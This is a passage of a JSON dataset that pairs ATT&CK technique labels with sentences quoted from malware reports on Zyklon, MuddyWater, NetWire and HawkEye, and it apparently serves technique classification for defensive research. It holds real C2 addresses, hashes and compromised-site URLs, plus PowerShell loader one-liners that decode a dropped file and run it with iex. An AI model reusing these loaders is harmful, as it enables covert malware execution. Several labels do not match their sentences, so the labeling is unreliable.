            "Figure 11: XML configuration file to schedule the task The Zyklon malware first retrieves the external IP address of the infected machine using the following:  api.ipify[.]org ip.anysrc[.]net myexternalip[.]com whatsmyip[.]com  The Zyklon executable contains another encrypted file in its .Net resource section named tor"
        ]
    },
    "connection proxy command-line interface-multi": {
        "technique_names": [
            "connection proxy",
            "command-line interface"
        ],
        "sentances": [
            "Command  Action    sign  Requests system information    settings  Requests settings from C2 server    logs  Uploads harvested passwords    wallet  Uploads harvested cryptocurrency wallet data    proxy  Indicates SOCKS proxy port opened    miner  Cryptocurrency miner commands    error  Reports errors to C2 server    ddos  DDoS attack commands    Table 1: Zyklon accepted commands The following figures show the initial request and subsequent server response for the \u201csettings\u201d (Figure 13), \u201csign\u201d (Figure 14), and \u201cddos\u201d (Figure 15) commands"
        ]
    },
    "system network configuration discovery remote file copy-multi": {
        "technique_names": [
            "system network configuration discovery",
            "remote file copy"
        ],
        "sentances": [
            "Figure 13: Zyklon issuing \u201csettings\u201d command and subsequent server response    Figure 14: Zyklon issuing \u201csign\u201d command and subsequent server response    Figure 15: Zyklon issuing \u201cddos\u201d command and subsequent server response Plugin Manager Zyklon downloads number of plugins from its C2 server"
        ]
    },
    "software packing exploitation for privilege escalation-multi": {
        "technique_names": [
            "software packing",
            "exploitation for privilege escalation"
        ],
        "sentances": [
            "The plugin URL is stored in file in following format:  /plugin/index.php?plugin=<Plugin_Name>  The following plugins are found in the memory of the Zyklon malware:  /plugin/index.php?plugin=cuda /plugin/index.php?plugin=minerd /plugin/index.php?plugin=sgminer /plugin/index.php?plugin=socks /plugin/index.php?plugin=tor /plugin/index.php?plugin=games /plugin/index.php?plugin=software /plugin/index.php?plugin=ftp /plugin/index.php?plugin=email /plugin/index.php?plugin=browser  The downloaded plugins are injected into: Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe"
        ]
    },
    "system network configuration discovery connection proxy-multi": {
        "technique_names": [
            "system network configuration discovery",
            "connection proxy"
        ],
        "sentances": [
            "Socks5 Proxy Zyklon features the ability to establish a reverse Socks5 proxy server on infected host machines"
        ]
    },
    "clipboard data system network configuration discovery-multi": {
        "technique_names": [
            "clipboard data",
            "system network configuration discovery"
        ],
        "sentances": [
            "Hijack Clipboard Bitcoin Address Zyklon has the ability to hijack the clipboard, and replaces the user\u2019s copied bitcoin address with an address served up by the actor\u2019s control server"
        ]
    },
    "security software discovery virtualization/sandbox evasion powershell-multi": {
        "technique_names": [
            "security software discovery",
            "powershell",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "Detection Name  Product  Action    POWERSHELL DOWNLOADER D (METHODOLOGY)  HX  Detect    SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)  HX  Detect    POWERSHELL DOWNLOADER (METHODOLOGY)  HX  Detect    SUSPICIOUS EQNEDT USAGE (METHODOLOGY)  HX  Detect    TOR (TUNNELER)  HX  Detect    SUSPICIOUS SVCHOST.EXE (METHODOLOGY)  HX  Detect    Malware.Binary.rtf  EX/ETP/NX  Block    Malware.Binary  EX/ETP/NX  Block    FE_Exploit_RTF_CVE_2017_8759  EX/ETP/NX  Block    FE_Exploit_RTF_CVE201711882_1  EX/ETP/NX  Block    Table 2: Current detection capabilities by FireEye products Indicators of Compromise The contained analysis is based on the representative sample lures shown in Table 3"
        ]
    },
    "deobfuscate/decode files or information system network configuration discovery-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "system network configuration discovery"
        ],
        "sentances": [
            "Decrypted Config: C&C IP: 192.168.0.107 Port: 80 Sleep Timer: 30000 Campaign Identifier: Mirage If you look at it the decrypted configuration, you may notice that the IP being used for the C&C is an internal IP address"
        ]
    },
    "spearphishing attachment account discovery user execution-multi": {
        "technique_names": [
            "spearphishing attachment",
            "account discovery",
            "user execution",
            "arp"
        ],
        "sentances": [
            "This indicates that the attackers stole and modified a legitimate document from the compromised user account, crafted a malicious decoy Word macro document using this stolen document and sent it to the target recipient who might be expecting the email from the original account user before the real sender had time to send it"
        ]
    },
    "spearphishing link deobfuscate/decode files or information file deletion spearphishing attachment user execution fallback channels-multi": {
        "technique_names": [
            "spearphishing link",
            "deobfuscate/decode files or information",
            "file deletion",
            "spearphishing attachment",
            "user execution",
            "fallback channels",
            "arp"
        ],
        "sentances": [
            "AutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tags:  MuddyWater PowerStats LazaGne DNSMessenger FIN7   Appendix A \u2013 C2 Addresses 148.251.204[.]131 144.76.109[.]88 138.201.75[.]227  Compromised Legitimate Sites 106[.]187[.]38[.]21 arbiogaz[.]com azmwn[.]suliparwarda[.]com bangortalk[.]org[.]uk best2[.]thebestconference[.]org camco[.]com[.]pk cbpexbrasilia[.]com[.]br cgss[.]com[.]pk diplomat[.]com[.]sa feribschat[.]eu ghanaconsulate[.]com[.]pk magical-energy[.]com mainandstrand[.]com riyadhfoods[.]com school[.]suliparwarda[.]com suliparwarda[.]com tmclub[.]eu watyanagr[.]nfe[.]go[.]th whiver[.]in www[.]4seasonrentacar[.]com www[.]akhtaredanesh[.]com www[.]arcadecreative[.]com www[.]armaholic[.]com www[.]asan-max[.]com www[.]autotrans[.]hr www[.]dafc[.]co[.]uk www[.]eapa[.]org www[.]elev8tor[.]com www[.]jdarchs[.]com www[.]kunkrooann[.]com www[.]mackellarscreenworks[.]com www[.]mitegen[.]com www[.]nigelwhitfield[.]com www[.]pomegranates[.]org www[.]ridefox[.]com www[.]shapingtomorrowsworld[.]org www[.]vanessajackson[.]co[.]uk www[.]yaran[.]co www[.]ztm[.]waw[.]pl coa[.]inducks[.]org mhtevents[.]com skepticalscience[.]com wallpapercase[.]com www[.]spearhead-training[.]com  Appendix B \u2013 Related files    sha256 Overall Description   d2a0eec18d755d456a34865ff2ffc14e3969ea77f7235ef5dfc3928972d7960f Loader script from 144.76.109[.]88   1421a5cd0566f4a69e7ca9cdefa380507144d7ed59cd22e53bfd25263c201a6f MuddyWater Macro   4e3c7defd6f3061b0303e687a4b5b3cc2a4ae84cdc48706c65a7b1e53402efc0 MuddyWater Macro   8b96804d861ea690fcb61224ec27b84476cf3117222cca05e6eba955d9395deb Lazagne   16985600c959f6267476da614243a585b1b222213ec938351ef6a26560c992db PS2EXE PowerStats (GitHub)   cf87a2ac51503d645e827913dd69f3d80b66a58195e5a0044af23ea6ba46b823 PS2EXE PowerStats (GitHub)   3030d80cfe1ee6986657a2d9b76b626ea05e2c289dee05bd7b9553b10d14e4a1 Decoded PowerStats payload   99077dcb37395603db0f99823a190f50313dc4e9819462c7da29c4bc983f42fd Lazagne Runner Script   1b60b7f9b0faf25288f1057b154413921a6cb373dcee43e831b9263c5b3077ce MuddyWater Macro   2c8d18f03b6624fa38cae0141b91932ba9dc1221ec5cf7f841a2f7e31685e6a1 MuddyWater Macro   367021beedb3ad415c69c9a0e657dc3ed82b1b24a41a71537d889f5e2b7ca433 MuddyWater Macro   58282917a024ac252966650361ac4cbbbed48a0df7cab7b9a6329d4a04551c0d MuddyWater Macro   58898648a68f0639c06bedc8242ca48bc6ec56f11ed40d00aa5fdda4e5553482 MuddyWater Macro   81523e0199ae1dc9e87d2b952642785bfbda6326f22e4c0794a19afdf001a9a3 MuddyWater Macro   90b66b3fef77962fbfda364a4f8799bfcc9ab73772026d7a8922a7cf5556a024 MuddyWater Macro   96101de2386e35bc5e38d32524a02c6c5ca7cc6624e656a629b2e0f1693a76fd MuddyWater Macro   964aaf5d9b1c749df0a2df1f1b4193e5a643893f251e2d74b47663f895da9b13 MuddyWater Macro   97f9a83bc6bb1b3f5cb7ac9401f95265597bff796bb4901631d6fa2c79a48bdc MuddyWater Macro   a3c1fd46177a078c4b95c744a24103df7d0a58cee1a3be92bc4cdd7dec1b1aa5 MuddyWater Macro   fcfbdffbcad731e0a5aad349215c87ed919865d66c287a6723fd8e2f896c5834 MuddyWater Macro   2bb1637c80f0a7df7260a8583beb033f4afbdd5c321ff5642bc8e1868194e009 MuddyWater Macro   58aec38e98aba66f9f01ca53442d160a2da7b137efbc940672982a4d8415a186 MuddyWater Macro   605fefc7829cfa41710e0b844084eab1f180fe513adc1d8f0f82501a154db0f4 MuddyWater Macro   e8a832b04dbdc413b71076754c3a0bf07cb7b9b61927248c482ddca32e1dab89 MuddyWater Macro   5d049bd7f478ea5d978b3c78f7f0afdf294a94f526fc20ffd6e33022d40d15ae MuddyWater Macro   12a7898fe5c75e0b57519f1e7019b5d09f5c5cbe49c48ab91daf6fcc09ee8a30 MuddyWater Macro   2602e817a67949860733b3548b37792616d52ffd305405ccab0409bcfedc5d63 MuddyWater Macro   42a4d9527063f73004b049a093a34a4fc3b6ea9505cb9b50b895486cb2dca94b MuddyWater Macro   5ed5fc6c6918ff6fa4eab7742c03d59155ca87e0fe12bac339f18928e2924a96 MuddyWater Macro   a2ad6bfc47c4f69a2170cc1a9fd620a68b1ebb474b7bdf601066e780e592222f MuddyWater Macro   c23ece07fc5432ca200f3de3e4c4b68430c6a22199d7fab11916a8c404fb63dc MuddyWater Macro   cb96cd26f36a3b1aacabfc79bbb5c1e0c9850b1c75c30aa498ad2d4131b02b98 MuddyWater Macro   ed2f9c9d5554d5248a7ad9ad1017af5f1bbadbd2275689a8b019a04c516eeec2 MuddyWater Macro   fe16543109f640ddbf3725e4d9f593de9f13ee9ae96c5e41e9cdccb7ab35b661 MuddyWater Macro   886e3a2f74bf8f46b23c78a6bad80c74fe33579f6fe866bc5075b034c4d5d432 MuddyWater Macro   8ec108b8f66567a8d84975728b2d5e6a2786c2ca368310cca55acad02bb00fa6 MuddyWater Macro   96d80ae577e9b899772a940b4941da39cf7399b5c852048f0d06926eb6c9868a MuddyWater Macro   bb1a5fb87d34c63ade0ed8a8b95412ba3795fd648a97836cb5117aff8ea08423 MuddyWater Macro   d65e2086aeab56a36896a56589e47773e9252747338c6b59c458155287363f28 MuddyWater Macro   588cd0fe3ae6fbd2fa4cf8de8db8ae2069ea62c9eaa6854caedf45045780661f MuddyWater Macro   917a6c816684f22934e2998f43633179e14dcc2e609c6931dd2fc36098c48028 MuddyWater Macro   db7bdd6c3ff7a27bd4aa9acc17dc35c38b527fb736a17d0927a0b3d7e94acb42 MuddyWater Macro   de6ce9b75f4523a5b235f90fa00027be5920c97a972ad6cb2311953446c81e1d MuddyWater Macro   a6673c6d52dd5361afd96f8143b88810812daa97004f69661da625aaaba9363b MuddyWater Macro   40a6b4c6746e37d0c5ecb801e7656c9941f4839f94d8f4cd61eaf2b812feaabe MuddyWater Macro     Appendix C \u2013 Proxy URLs found from POWERSTATS samples from October 2017 onwards hxxp://106[.]187[.]38[.]21/short_qr/work[.]php?c= hxxp://arbiogaz[.]com/upload/work[.]php?c= hxxp://azmwn[.]suliparwarda[.]com/wp-content/plugins/wpdatatables/panda[.]php?c= hxxp://azmwn[.]suliparwarda[.]com/wp-content/themes/twentyfifteen/logs[.]php?c= hxxp://bangortalk[.]org[.]uk/speakers[.]php?c= hxxp://best2[.]thebestconference[.]org/ccb/browse_cat[.]php?c= hxxp://camco[.]com[.]pk/Controls/data[.]aspx?c= hxxp://cbpexbrasilia[.]com[.]br/wp-content/plugins/wordpress-seo/power[.]php?c= hxxp://cbpexbrasilia[.]com[.]br/wp-includes/widgets/work[.]php?c= hxxp://cgss[.]com[.]pk/data[.]aspx?c= hxxp://diplomat[.]com[.]sa/wp-content/plugins/wordpress-importer/cache[.]php?c= hxxp://feribschat[.]eu/logs[.]php?c= hxxp://ghanaconsulate[.]com[.]pk/data[.]aspx?c= hxxp://magical-energy[.]com/css[.]aspx?c= hxxp://magical-energy[.]com/css/css[.]aspx?c= hxxp://mainandstrand[.]com/work[.]php?c= hxxp://riyadhfoods[.]com/css/edu[.]aspx?c= hxxp://riyadhfoods[.]com/jquery-ui/js/jquery[.]aspx?c= hxxp://school[.]suliparwarda[.]com/components/com_akeeba/work[.]php?c= hxxp://school[.]suliparwarda[.]com/plugins/editors/codemirror/work[.]php?c= hxxp://suliparwarda[.]com/includes/panda[.]php?c= hxxp://suliparwarda[.]com/layouts/joomla/logs[.]php?c= hxxp://suliparwarda[.]com/wp-content/plugins/entry-views/work[.]php?c= hxxp://suliparwarda[.]com/wp-content/themes/twentyfifteen/work[.]php?c= hxxp://tmclub[.]eu/clubdata[.]php?c= hxxp://watyanagr[.]nfe[.]go[.]th/e-office/lib/work[.]php?c= hxxp://watyanagr[.]nfe[.]go[.]th/watyanagr/power[.]php?c= hxxp://whiver[.]in/power[.]php?c= hxxp://www[.]4seasonrentacar[.]com/viewsure/data[.]aspx?c= hxxp://www[.]akhtaredanesh[.]com/d/file/sym/work[.]php?c= hxxp://www[.]akhtaredanesh[.]com/d/oschool/power[.]php?c= hxxp://www[.]arcadecreative[.]com/work[.]php?c= hxxp://www[.]armaholic[.]com/list[.]php?c= hxxp://www[.]asan-max[.]com/files/articles/css[.]aspx?c= hxxp://www[.]asan-max[.]com/files/articles/large/css[.]aspx?c= hxxp://www[.]autotrans[.]hr/index[.]php?c= hxxp://www[.]dafc[.]co[.]uk/news[.]php?c= hxxp://www[.]eapa[.]org/asphalt[.]php?c= hxxp://www[.]elev8tor[.]com/show-work[.]php?c= hxxp://www[.]jdarchs[.]com/work[.]php?c= hxxp://www[.]kunkrooann[.]com/inc/work[.]php?c= hxxp://www[.]mackellarscreenworks[.]com/work[.]php?c= hxxp://www[.]mitegen[.]com/mic_catalog[.]php?c= hxxp://www[.]nigelwhitfield[.]com/v2/work[.]php?c= hxxp://www[.]pomegranates[.]org/index[.]php?c= hxxp://www[.]ridefox[.]com/content[.]php?c= hxxp://www[.]shapingtomorrowsworld[.]org/category[.]php?c= hxxp://www[.]vanessajackson[.]co[.]uk/work[.]php?c= hxxp://www[.]yaran[.]co//wp-content/plugins/so-masonry/logs[.]php?c= hxxp://www[.]yaran[.]co/wp-includes/widgets/logs[.]php?c= hxxp://www[.]ztm[.]waw[.]pl/pop[.]php?c= hxxps://coa[.]inducks[.]org/publication[.]php?c= hxxps://mhtevents[.]com/account[.]php?c= hxxps://skepticalscience[.]com/graphics[.]php?c= hxxps://wallpapercase[.]com/wp-content/themes/twentyfifteen/logs[.]php?c= hxxps://wallpapercase[.]com/wp-includes/customize/logs[.]php?c= hxxps://www[.]spearhead-training[.]com//html/power[.]php?c= hxxps://www[.]spearhead-training[.]com/work[.]php?c= \u00a0 The post Muddying the Water: Targeted Attacks in the Middle East appeared first on Palo Alto Networks Blog"
        ]
    },
    "file deletion file and directory discovery-multi": {
        "technique_names": [
            "file deletion",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "Regardless of the file extensions, the files dropped by the macro are EITHER INF, SCT and text files OR VBS and text files"
        ]
    },
    "deobfuscate/decode files or information masquerading powershell-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "masquerading",
            "powershell"
        ],
        "sentances": [
            "powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u201d,$d));  PowerShell one-liner Encoded text file Execution flow:  Case 2: VBS and text files dropped by the macro The VBS file decodes itself and calls mshta.exe, passing on one line of VBScript code to it, which in turn spawns a PowerShell one-liner which finally consumes the text file (usually Base64-encoded text)"
        ]
    },
    "masquerading powershell-multi": {
        "technique_names": [
            "masquerading",
            "powershell"
        ],
        "sentances": [
            "powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini))));  PowerShell one-liner Encoded text file Execution flow:  The PowerShell code When PowerShell is invoked whether via WMI, wscript.exe, or mshta.exe, it executes a one-liner PowerShell code (as outlined above) that reads the encoded text file dropped in ProgramData and then decodes it"
        ]
    },
    "system owner/user discovery data from local system account discovery user execution-multi": {
        "technique_names": [
            "system owner/user discovery",
            "data from local system",
            "account discovery",
            "user execution"
        ],
        "sentances": [
            "The paths discovered are:  \u2022 C:\\Users\\leo\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \u2022 C:\\Users\\poopak\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \u2022 C:\\Users\\Vendetta\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \u2022 C:\\Users\\Turk\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd   Leo, Poopak, Vendetta and Turk are the usernames of those creating the documents or the templates on which they are based"
        ]
    },
    "code signing standard application layer protocol scheduled task deobfuscate/decode files or information file and directory discovery exploitation for client execution hidden files and directories-multi": {
        "technique_names": [
            "code signing",
            "standard application layer protocol",
            "scheduled task",
            "deobfuscate/decode files or information",
            "file and directory discovery",
            "exploitation for client execution",
            "hidden files and directories",
            "tor"
        ],
        "sentances": [
            "Contact: intelreports@kaspersky.com Indicators of compromise MD5 08acd1149b09bf6455c553f512b51085 a9ec30226c83ba6d7abb8d2011cdae14 E5683fb480353c0dec333a7573710748 159238b473f80272fdcd0a8ddf336a91 16ac1a2c1e1c3b49e1a3a48fb71cc74f 1b086ab28e3d6f73c6605f9ae087ad4a 23c82e8c028af5c64cbe37314732ec19 24e1bd221ba3813ed7b6056136237587 2e82e242cb0684b98a8f6f2c0e8a12f3 37f7e6e5f073508e1ee552ebea5d200e 3bb14adb551663fd2328d59f653ba757 3c2a0d6d0ecf06f1be9ad411d06f7ba8 4c5a5c236c9f4480b3d725f297673fad 4f873578956d2790101443f24e4bd4d3 5466c8a099d1d30096775b1f4357d3cf 59502e209aedf80e170e653306ca1553 5a42a712e3b3cfa1db32d9e3d832f8f1 5bd61a94e7698574eaf82ef277316463 5de97ae178888f2dd222bb8a66060ac2 665947cf7037a6772687b69279753cdf 7a2ff07283ddc69d9f34cfa0d3c936d4 7beb94f602e97785370fec2d059d54a5 801f34abbf90ac2b4fb4b6289830cd16 864d6321be50f29e7a7a4bfab746245a 8a36d91ca331f62642dbcafc2ea1b1ab 9486593e4fb5a4d440093d54a3519187 94edf251b5fe7cc19488b5f0c3c3e359 9c6648cedeb3f5d9f6d104e638bd0c3d 9f4044674100a8c28f9ed1b336c337ce aa1e8d0e1c4d4eb9984124df003ea7f2 aa564e207926d06b8a59ba50ca2c543d ab4f947f4649b9ec28d182b02778aa69 ad92ccf85ec170f340457d33bbb81df5 b8939fa58fad8aa1ec271f6dae0b7255 bb476622bcb0c666e12fbe4ccda8bbef be62fc5b1576e0a8491519e10bab931d bf310319d6ef95f69a45fc4f2d237ed4 c375bbf248592cee1a1999227457c300 c73fc71ee35e99230941f03fc32934d9 c8b0458c384fd34971875b1c753c9c7c cd371d1d3bd7c8e2110587cfa8b7eaea ce2df2907ce543438c19cfaf6c14f699 d15aee026074fbd18f780fb51ec0632a d632c8444aab1b43a663401e80c0bac4 d6acee43d61cbd4bcd7a5bdf4ed9b343 e3e25957b738968befcf2333aa637d97 e5683fb480353c0dec333a7573710748 eb69fb45feb97af81c2f306564acc2da f00fd318bf58586c29ab970132d1fd2a f2b5373f32a4b9b3d34701ff973ba69c f84914c30ae4e6b9b1f23d5c01e001ed faa4469d5cd90623312c86d651f2d930 Ffb8ea0347a3af3dd2ab1b4e5a1be18a 345b1ea293764df86506f97ba498cc5e 029cb7e622f4eb0d058d577c9d322e92 06178b5181f30ce00cd55e2690f667ac 2b8ab9112e34bb910055d85ec800db3f 47ec75d3290add179ac5218d193bb9a8 befc203d7fa4c91326791a73e6d6b4da C561e81e30316208925bfddb3cf3360a 132efd7b3bdfb591c1bf2a4e19c710eb e7a6c57566d9523daa57fe16f52e377e c0e35c4523a7931f4c99616d6079fd14 245fa82c89875b70c2669921d4ba14d3 File names %SystemDrive%\\ProgramData\\EventManager.dll %SystemDrive%\\ProgramData\\EventManager.logs %SystemDrive%\\ProgramData\\WindowsDefenderService.ini %SystemDrive%\\ProgramData\\Defender.sct %SystemDrive%\\ProgramData\\DefenderService.inf %SystemDrive%\\ProgramData\\WindowsDefender.ini %SystemDrive%\\ProgramData\\ZIPSDK\\InstallConfNT.vbs %SystemDrive%\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini %SystemDrive%\\ProgramData\\WindowsDefenderTask.ini %SystemDrive%\\ProgramData\\WindowsDefenderTask.txt %SystemDrive%\\ProgramData\\WindowsDefenderTask.xml %SystemDrive%\\ProgramData\\DefenderNT\\ConfigRegister.vbs %SystemDrive%\\ProgramData\\DefenderNT\\SetupConf.ini %SystemDrive%\\ProgramData\\ASDKiMalwareSDK\\ProjectConfSDK.vbs %SystemDrive%\\ProgramData\\ASDKiMalwareSDK\\SetupConfSDK.ini %SystemDrive%\\ProgramData\\FirefoxSDK\\ConfigRegisterSDK.ini %SystemDrive%\\ProgramData\\FirefoxSDK\\ConfigRegisterSDK.vbs %SystemDrive%\\ProgramData\\OneDrive.dll %SystemDrive%\\ProgramData\\OneDrive.html %SystemDrive%\\ProgramData\\OneDrive.ini %SystemDrive%\\ProgramData\\WindowsNT\\WindowsNT.ini %SystemDrive%\\ProgramData\\WindowsNT\\WindowsNT.vbs %SystemDrive%\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs %SystemDrive%\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini %windir%\\System32\\Tasks\\Microsoft\\WindowsDefenderUpdater %windir%\\System32\\Tasks\\Microsoft\\MicrosoftOneDrive %windir%\\System32\\Tasks\\Microsoft\\WindowsDifenderUpdate %windir%\\System32\\Tasks\\Microsoft\\WindowsSystem32SDK %windir%\\System32\\Tasks\\Microsoft\\WindowsDefenderSDK %windir%\\System32\\Tasks\\Microsoft\\WindowsMalwareDefenderSDK %windir%\\System32\\Tasks\\Microsoft\\WindowsMalwareByteSDK Domains, URLs and IP addresses http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php https://www.adfg[.]ae/wp-includes/widgets/main.php http://adibf[.]ae/wp-includes/js/main.php http://hubinasia[.]com/wp-includes/widgets/main.php https://benangin[.]com/wp-includes/widgets/main.php 104.237.233.60 104.237.255.212 104.237.233.40 5.9.0.155"
        ]
    },
    "data staged shortcut modification-multi": {
        "technique_names": [
            "data staged",
            "shortcut modification"
        ],
        "sentances": [
            "Upon execution, the \u201cWindows Folder.exe\u201d file copies itself to C:\\Users\\<username>\\AppData\\Roaming and creates a Windows shortcut (LNK) file in the victim\u2019s Startup directory as a persistence mechanism"
        ]
    },
    "process hollowing process injection-multi": {
        "technique_names": [
            "process hollowing",
            "process injection"
        ],
        "sentances": [
            "(Source: SecureWorks)  The \u201cWindows Folder.exe\u201d executable spawns and injects code into the legitimate notepad.exe Windows process (see Figure 2)",
            "The function will take another executable embedded in the initial Trojan as a resource named \u201cM\u201d, which it attempts to inject into the following process to execute: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe While it\u2019s configured to inject into cvtres.exe, the Trojan is also capable of injecting its code into the following process as well: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \u00a0 Embedded injector Trojan The R payload discussed above is nothing more than an injector Trojan, which accepts a path to an executable and a buffer of code to inject into the process as arguments"
        ]
    },
    "system owner/user discovery input capture-multi": {
        "technique_names": [
            "system owner/user discovery",
            "input capture"
        ],
        "sentances": [
            "(Source: SecureWorks)  NetWire logs keystrokes and peripheral inputs into encoded files in the C:\\Users\\<username>   Figure 3"
        ]
    },
    "new service fallback channels-multi": {
        "technique_names": [
            "new service",
            "fallback channels"
        ],
        "sentances": [
            "In December 2018, a thread on HackForums described a change in the ownership and ongoing development of the HawkEye keylogger.Shortly following this exchange, new posts began to appear that were attempting to market and sell new versions of HawkEye (HawkEye Reborn v9), with these new posts also referencing the change in ownership of the project moving forward.HawkEye Reborn v9 is currently marketed as an \"Advance Monitoring Solution.\" It is currently being sold using a licensing model, with purchasers gaining access to the software and updates for different periods based on a tiered pricing model.HawkEye Reborn v9 also features a Terms of Service agreement that provides some additional insight"
        ]
    },
    "spearphishing attachment file and directory discovery-multi": {
        "technique_names": [
            "spearphishing attachment",
            "file and directory discovery",
            "arp",
            "tor"
        ],
        "sentances": [
            "An example of one of these emails is below:Figure 1: Example email messageWhile the current email contains leverage malicious Microsoft Excel files, earlier campaigns have also been observed leveraging RTF and DOC files"
        ]
    },
    "process discovery input capture-multi": {
        "technique_names": [
            "process discovery",
            "input capture"
        ],
        "sentances": [
            "Assuming the victim opens the attachment, the infection process begins as described in the following section.Many of the distribution servers that are being used to host the HawkEye keylogger binaries that are retrieved during the infection process are hosting large numbers of malicious binaries and, in many cases, contain open directory listings that can be used to identify the scope of the infections that they are being used to facilitate"
        ]
    },
    "disabling security tools deobfuscate/decode files or information-multi": {
        "technique_names": [
            "disabling security tools",
            "deobfuscate/decode files or information"
        ],
        "sentances": [
            "When HawkEye is executed, in line 34, byte[] byte_ = gclass.method_0()[\"0\", GClass30.GEnum3.RCDATA].Byte_0;it reads the encrypted configuration from the RCDATA resource and in line 33,byte[] byte_2 = GClass29.smethod_12(byte_, GClass12.string_0);and then decrypts this data with the Rijndael algorithm you can see below in the RijndaelManaged function to initialize the HawkEye configuration settings.The decrypted configuration shows us the account used for exfiltration:The main loop of HawkEye has the following functions:This shows the rich feature set of HawkEye"
        ]
    },
    "screen capture credential dumping system information discovery video capture-multi": {
        "technique_names": [
            "screen capture",
            "credential dumping",
            "system information discovery",
            "video capture",
            "ping"
        ],
        "sentances": [
            "The adversaries can get detailed information about the victim's machine, as you can see in the screenshot below.Beside the system information, it steals passwords from common web browsers, Filezilla, Beyluxe Messenger, CoreFTP and the video game \"Minecraft.\" It also starts a keylogger, steals clipboard content, takes screenshots from the desktop and pictures from the webcam"
        ]
    },
    "disabling security tools standard application layer protocol-multi": {
        "technique_names": [
            "disabling security tools",
            "standard application layer protocol"
        ],
        "sentances": [
            "HawkEye offers the following exfiltration options based on the configuration: email, FTP, SFTP, HTTP POST to PanelURL API or ProxyURL.As mentioned above, in the comments of the main loop section, it also comes with several anti-analysis features, including starting an anti-debugging thread or disabling certain AV-related programs via the Image File Execution Options (IFEO) evasion technique by registering invalid debuggers that redirect and effectively disable various system and security applications.The following diagram summarizes the full infection process:ConclusionRecent changes in both the ownership and development efforts of the HawkEye Reborn keylogger/stealer demonstrate that this is a threat that will continue to experience ongoing development and improvement moving forward"
        ]
    },
    "spearphishing link security software discovery disabling security tools spearphishing attachment user execution dll side-loading-multi": {
        "technique_names": [
            "spearphishing link",
            "security software discovery",
            "disabling security tools",
            "spearphishing attachment",
            "user execution",
            "dll side-loading",
            "arp"
        ],
        "sentances": [
            "Talos continues to monitor this threat as it changes to ensure that customers remain protected from this and other threats as they continue to emerge and evolve.CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security\u00a0can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX\u00a0can detect malicious activity associated with this threat.AMP Threat Grid\u00a0helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on\u00a0Snort.org.Indicators of compromiseThe following IOCs are associated with various malware distribution campaigns that were observed during the analysis of Hawkeye Reborn v9 activity.Attachment hashes (SHA256)A list of hashes observed to be associated with malicious email attachments can be found here.PE32 hashes (SHA256)A list of hashes observed to be associated with malicious PE32 executables can be found here.DomainsThe following domains have been observed to be associated with malware campaigns"
        ]
    },
    "timestomp hidden files and directories system time discovery-multi": {
        "technique_names": [
            "timestomp",
            "hidden files and directories",
            "system time discovery",
            "tor"
        ],
        "sentances": [
            "The dropper installs the backdoor, sets its attributes to \u201chidden\u201d, and sets a random file date and time When the dropper installs the backdoor, it sets its attributes to \u201chidden\u201d and sets file date and time to\u00a0 random values using the touch command: touch \u2013t YYMMDDMM \u201c/path/filename\u201d > /dev/null"
        ]
    },
    "hidden files and directories launch agent-multi": {
        "technique_names": [
            "hidden files and directories",
            "launch agent",
            "tor"
        ],
        "sentances": [
            "Afterwards, the persistence file will be created in /Library/LaunchDaemons/ or ~/Library/LaunchAgents/ \u00a0folder"
        ]
    },
    "custom cryptographic protocol data encrypted-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "data encrypted"
        ],
        "sentances": [
            "Encoding the encryption key  In order for the C&C server to decrypt the encrypted data, the randomly generated AES256 key must be included in the packet along with the encrypted data"
        ]
    },
    "screen capture standard cryptographic protocol-multi": {
        "technique_names": [
            "screen capture",
            "standard cryptographic protocol"
        ],
        "sentances": [
            "Function for scrambling AES256 key in the outgoing packet  Some screenshots taken during scrambling and encryption process:   Figure 21.\u00a0The highlighted bytes represent the scrambled computer info   Figure 22.\u00a0Randomly generated AES256 key   Figure 23.\u00a0Scrambled AES256 key (0xC1 XOR 0x13 = 0xD2, 0xD2 ROL 6 = 0xB4) etc.)   Figure 24.\u00a0Computer info encrypted with AES256 key   Figure 25.\u00a0Screenshot of the final payload to be sent to C&C server"
        ]
    },
    "deobfuscate/decode files or information fallback channels-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "fallback channels"
        ],
        "sentances": [
